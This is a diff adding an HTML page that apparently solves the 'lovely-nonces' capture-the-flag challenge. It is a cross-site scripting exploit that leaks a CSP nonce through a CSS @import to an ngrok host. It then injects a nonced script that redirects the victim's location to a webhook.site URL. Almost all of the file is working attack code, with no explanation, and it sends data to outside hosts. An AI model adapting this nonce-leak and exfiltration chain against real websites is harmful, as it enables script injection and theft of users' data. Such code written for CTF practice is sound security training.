@@ -1,0 +1,53 @@
+<html>
+    <head>
+    </head>
+    <body>
+
+       <script>
+           //const win =  window.open("http://lovely-nonces.asisctf.com:8000/#")
+            const a=document.createElement('iframe');
+            a.id='frame';
+            a.src='http://lovely-nonces.asisctf.com:8000/#<style>@import url(http://d121-103-170-54-205.ngrok.io/);</style>';
+            document.body.append(a)
+       </script>
+       <script>
+            
+            change =()=>{
+                   // win.location.href=win.location.href;
+               a.src=a.src
+           }
+           const sleep = (milliseconds) => {
+                return new Promise(resolve => setTimeout(resolve, milliseconds))
+            }
+            start=async()=>{ 
+                 win = window.open("http://lovely-nonces.asisctf.com:8000/#<style>@import url(http://d121-103-170-54-205.ngrok.io/);</style>", "mywin")
+                i=0 
+                while(true){
+                    change();
+                    fetch('/p').then((r)=>r.text()).then(async(r)=>{
+                        if(r.length==16){
+                        a.src=`http://lovely-nonces.asisctf.com:8000/#<iframe srcdoc="<script nonce=${r}>document.location.href%3D'https%3A%2F%2Fwebhook.site%2Fbbbca464-39a1-4589-a3f3-e96332013029/?a='%2Bwindow.parent.location%3B%3B%3C%2Fscript%3E">`
+                            //a.src=`http://lovely-nonces.asisctf.com:8000/#<iframe srcdoc="<script nonce=${r} >alert()%3C%2Fscript%3E">`
+                            await sleep(500);
+                        }
+                     });
+                    await sleep(500);
+                    i++;
+                    if(i==55) break;
+                
+                }
+                
+            }
+            
+            //const win = window.open("http://lovely-nonces.asisctf.com:8000/#<style>@import url(http://d121-103-170-54-205.ngrok.io/);</style>", "mywin")
+            
+            //console.log(win.location.href);
+            start();
+            
+       </script>
+    
+   
+    </body>
+    
+</html>
+
